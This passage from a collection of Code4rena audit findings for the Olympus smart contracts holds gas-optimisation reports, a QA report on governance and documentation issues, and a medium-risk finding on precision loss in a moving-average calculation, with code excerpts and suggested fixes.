https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L376 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L403 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L404 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L418 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L455 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L456 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L528 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L529 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L530 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L535 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L536 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L560 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L561 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L562 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L665 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L705 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L707 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L708 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L717 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L719 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L720  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L58 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L69  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L13 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L14 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L15 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L16 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L17 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L18 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L19 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L31 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L32 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L33 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L85 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L93 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L94 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L95 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L101 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L110 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L111 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L112   ## G-08 Using private rather than public for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  9 instances in 4 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137    ## G-09 Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be abstract and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (if(x){}else if(y){...}else{...} => if(!x){if(y){...}else{...}})  2 instances in 1 file:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143   ## G-10 calldata instead of memory for read-only function parameter  If a reference type function parameter is read-only, it is cheaper in gas to use calldata instead of memory. Calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory. Try to use calldata as a data location because it will avoid copies and also makes sure that the data cannot be modified.  5 instances in 3 files:  https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L139 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L393  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L53 "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/496", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## [L-01]: Upgrades to `VOTES` module can lead to governance vulnerabilities The comment in [VOTES.sol#L10](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L10): ``` /// @dev    This is currently a substitute module that stubs gOHM. ``` means that the `VOTES` module is temporary and will be replaced by a form of governance token (could be staked gOHM for example). One must be sure before upgrading that the new token does not present a `transfer` function nor any mechanism or bypass that effectively allows to transfer tokens in between addresses. If the contrary is true, it would lead to a double endorsing issue (possibility to call [`OlympusGovernance.endorseProposal()`](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L181) a second time after getting the same tokens to a different address). Note that a bypass that allows transfer of tokens without delay could be used by an attacker to get unlimited endorsement power and execute a DoS on the governance by frontrunning calls to `activateProposal()` with a self-endorsed proposal.  ## [L-02]: Voting temporarily reduces endorsing power When calling `vote()` on the governance, `VOTES` token are transfered temporarily to the governance contract ([Governance.sol#L259](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L259)), so one must wait before being able to endorse a  proposal again.  ## [L-03]: Missing events for critical changes in system parameters Change of critical system parameters should come with an event emission to allow for monitoring of potentially dangerous or malicious changes. Occurrencies of this issue are [Kernel.sol#L77](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L77), [Kernel.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L127), [BondCallback.sol#L190](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L190)  ## [L-04]: `executor` can become also `admin` At [Kernel.sol#L253](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L253) the `executor` is allowed to become also `admin` of the `Kernel`. Consider checking that the `admin` set is not the `executor` (and vice versa at [Kernel.sol#L251](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L251)) to avoid full centralization of the system.  ## [L-05]: Open `TODO`s Open TODOs can point to architecture or programming issues that still need to be resolved. Occurrencies at [TreasuryCustodian.sol#L51-L56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L51-L56), [Operator.sol#L657](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L657). All issues raised in TODOs should be addressed before deployment.  ## [NC-01]: Missing/Incomplete/Incorrect Natspec comments:  - missing Natspec comments for public / external functions:   - [TRSRY.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L59)   - [MINTR.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L33)   - [MINTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L37)   - [VOTES.sol#L35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L35)   - [VOTES.sol#L39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L39)   - [Governance.sol#L61](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L61)   - [Governance.sol#L70](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L70)  - missing Natspec comments for public getters:    - [Kernel.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L63)   - [MINTR.sol#L9](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/MINTR.sol#L9)   - [RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L65)   - [BondCallback.sol#L24-L26](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L24-L26)   - [Governance.sol#L56-L57](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L56-L57)   - [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L83)   - [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L86)   - [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L89)    - missing function parameters:   - [Kernel.sol#L75](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L75)   - [Kernel.sol#L126](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L126)   - [Kernel.sol#L234](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L234)   - [INSTR.sol#36](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L36)   - [INSTR.sol#42](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L42)   - [TRSRY.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L63)   - [TRSRY.sol#L74](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L74)   - [TRSRY.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L92)   - [TRSRY.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L105)   - [TRSRY.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/TRSRY.sol#L121)   - [VOTES.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L45)   - [VOTES.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L50)   - [Governance.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L144)  - missing function return values   - [INSTR.sol#42](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L42)   - [RANGE.sol#L274](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L274)   - [RANGE.sol#L279](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L279)   - [RANGE.sol#L289](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L289)   - [RANGE.sol#L300](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L300)   - [RANGE.sol#L318](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L318)   - [RANGE.sol#L329](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L329)   - [RANGE.sol#L339](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L339)   - [Governance.sol#L144](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L144)   - [Governance.sol#L150](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L150)   - [IHeart.sol#L17](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IHeart.sol#L17)   - [IOperator.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/interfaces/IOperator.sol#L143)  - incorrect comments:   - [Kernel.sol#L167](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L167): should be `Mapping of keycode to module address`   - [Kernel.sol#L170](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L170): should be `Mapping of keycode to module address`   - [Kernel.sol#L180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L180): `Policy` and `Keycode` should be inverted   Consider adding missing Natspec comments according to the relevant [section](https://docs.soliditylang.org/en/v0.8.16/natspec-format.html#natspec) in the solidity docs.  ## [NC-02]: Redundant code: At [Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L223) and [Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L306) use of `bool == true` is equivalent to just `bool`.  ## [NC-03]: Use custom error when `netVotes` should underflow In [QA.md#L82](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/audit/QA.md#L82) check that `yesVotesForProposal[activeProposal.proposalId] > noVotesForProposal[activeProposal.proposalId]` before subtracting and revert with custom error `NotEnoughVotesToExecute` if not. This avoids to have a Panic error due to underflow in case `netVotes` should underflow."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/491", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## [G-01] onlyKernel MODIFIER IS NOT NEEDED FOR VIEW FUNCTIONS Calling the following `requestPermissions` view functions, which are called by non-view functions, such as [`_activatePolicy`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L295-L323) and [`_deactivatePolicy`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325-L346), will use gas. Because these `requestPermissions` functions have the `onlyKernel`, more run-time gas is used when calling these. Since view functions do not modify states, it is safe for these view functions to not use `onlyKernel`. Moreover, other similar view functions, such as [`Operator.requestPermissions`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L171-L186) do not use `onlyKernel` already. Please consider removing `onlyKernel` from the following view functions.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L60-L76 ```solidity     function requestPermissions()         external         view         override         onlyKernel         returns (Permissions[] memory requests)     {         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();         Keycode MINTR_KEYCODE = MINTR.KEYCODE();          requests = new Permissions[](4);         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.withdrawReserves.selector);         requests[2] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);         requests[3] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);     } ```  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L70-L80 ```solidity     function requestPermissions()         external         view         override         onlyKernel         returns (Permissions[] memory requests)     {         requests = new Permissions[](2);         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);     } ```  ## [G-02] REVERT CHECK CAN BE PLACED AT START OF FUNCTION BODY IF POSSIBLE When a `revert` check is allowed to be placed at the start of the function body, the subsequent operations that cost more gas are prevented from running if it does revert.  `if (length == 0) revert INSTR_InstructionsCannotBeEmpty()` can be placed after `uint256 length = instructions_.length;` in the following code. https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L42-L79 ```solidity     function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {         uint256 length = instructions_.length;         uint256 instructionsId = ++totalInstructions;          Instruction[] storage instructions = storedInstructions[instructionsId];          if (length == 0) revert INSTR_InstructionsCannotBeEmpty();          ...     } ```  `if (activeProposal.proposalId == 0) { revert NoActiveProposalDetected(); }` and `if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { revert UserAlreadyVoted(); }` can be placed above `uint256 userVotes = VOTES.balanceOf(msg.sender);` in the following code. https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262 ```solidity     function vote(bool for_) external {         uint256 userVotes = VOTES.balanceOf(msg.sender);          if (activeProposal.proposalId == 0) {             revert NoActiveProposalDetected();         }          if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {             revert UserAlreadyVoted();         }          ...     } ```  ## [G-03] VARIABLE DOES NOT NEED TO BE INITIALIZED TO ITS DEFAULT VALUE Explicitly initializing a variable with its default value costs more gas than uninitializing it. For example, `uint256 i` can be used instead of `uint256 i = 0` in the following code. ```solidity Kernel.sol   397: for (uint256 i = 0; i < reqLength; ) {  utils\\KernelUtils.sol   43: for (uint256 i = 0; i < 5; ) {   58: for (uint256 i = 0; i < 32; ) { ```  ## [G-04] ARRAY LENGTH CAN BE CACHED OUTSIDE OF LOOP Caching the array length outside of the loop and using the cached length in the loop costs less gas than reading the array length for each iteration. For example, `instructions.length` in the following code can be cached outside of the loop like `uint256 instructionsLength = instructions.length`, and `i < instructionsLength` can be used for each iteration. ```solidity policies\\Governance.sol   278: for (uint256 step; step < instructions.length; ) { ```  ## [G-05] ++VARIABLE CAN BE USED INSTEAD OF VARIABLE++ ++variable costs less gas than variable++. For example, `i++` can be changed to `++i` in the following code. ```solidity policies\\Operator.sol   488: decimals++;   670: _status.low.count++;   686: _status.high.count++;    utils\\KernelUtils.sol   49: i++;   64: i++; ```  ## [G-06] X = X + Y CAN BE USED INSTEAD OF X += Y x = x + y costs less gas than x += y. For example, `balanceOf[to_] += amount_` can be changed to `balanceOf[to_] = balanceOf[to_] + amount_` in the following code. ```solidity modules\\PRICE.sol   136: _movingAverage += (currentPrice - earliestPrice) / numObs;   222: total += startObservations_[i];  modules\\TRSRY.sol   96: reserveDebt[token_][msg.sender] += amount_;   97: totalDebt[token_] += amount_;   131: if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  modules\\VOTES.sol   58: balanceOf[to_] += amount_;  policies\\BondCallback.sol   143: _amountsPerMarket[id_][0] += inputAmount_;   144: _amountsPerMarket[id_][1] += outputAmount_;  policies\\Governance.sol   198: totalEndorsementsForProposal[proposalId_] += userVotes;   252: yesVotesForProposal[activeProposal.proposalId] += userVotes;   254: noVotesForProposal[activeProposal.proposalId] += userVotes;  policies\\Heart.sol   103: lastBeat += frequency(); ```"}, {"title": "Moving average precision is lost", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/483", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139   # Vulnerability details  Now the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.  For example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.  ## Proof of Concept  Moving average is calculated with the addition of the difference:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139  ```solidity         // Calculate new moving average         if (currentPrice > earliestPrice) {             _movingAverage += (currentPrice - earliestPrice) / numObs;         } else {             _movingAverage -= (earliestPrice - currentPrice) / numObs;         } ```  `/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.  It is returned on request as is:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized();         return _movingAverage;     } ```  ## Recommended Mitigation Steps  Consider storing the cumulative `sum`, while returning `sum / numObs` on request:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193  ```solidity     /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).     function getMovingAverage() external view returns (uint256) {         if (!initialized) revert Price_NotInitialized(); -       return _movingAverage; +       return _movingAverage / numObservations;     } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/480", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## G001\u00a0`++I`\u00a0COSTS LESS GAS COMPARED TO\u00a0`I++`\u00a0OR\u00a0`I += 1`\u00a0(SAME FOR\u00a0`--I`\u00a0VS\u00a0`I--`\u00a0OR\u00a0`I -= 1`)  Pre-increments and pre-decrements are cheaper.  For a\u00a0`uint256 i`\u00a0variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1`\u00a0is the most expensive form - `i++`\u00a0costs 6 gas less than\u00a0`i += 1` - `++i`\u00a0costs 5 gas less than\u00a0`i++`\u00a0(11 gas less than\u00a0`i += 1`)  **Decrement:**  - `i -= 1`\u00a0is the most expensive form - `i--`\u00a0costs 11 gas less than\u00a0`i -= 1` - `--i`\u00a0costs 5 gas less than\u00a0`i--`\u00a0(16 gas less than\u00a0`i -= 1`)  [https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488)  ```solidity decimals++; ```  # ****G002 - Cache Array Length Outside of Loop****  ### **Description**  Caching the array length outside a loop saves reading it on each iteration, as long as the array's length is not changed during the loop.  [https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278)  ```solidity for (uint256 step; step < instructions.length; ) { ```  Background info  [https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36](https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/36)  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/478", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "**Pre-incrementing is cheaper than post-incrementing** Consider replacing e.g. `i++` with `++i`.  Instances:  KernelUtils.sol: [49](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L49) [64](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L64)  &nbsp;  **Function not called by the contract can be `external` instead of `public`**  Instances: Kernel.sol: [95](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L95) [100](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L100) [439](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L439) [451](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L451) TRSRY.sol: [47](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L47) [79](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L79) MINTR.sol: [20](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L20) [25](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L25) [33](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L33) [37](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L37) RANGE.sol: [110](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L110) [115](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L115) [219](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L219) PRICE.sol: [108](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L108) [113](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L113) VOTES.sol: [22](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L22) [27](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L27) [45](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L45) [55](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/VOTES.sol#L55) INSTR.sol:  [23](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L23) [28](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/INSTR.sol#L28) 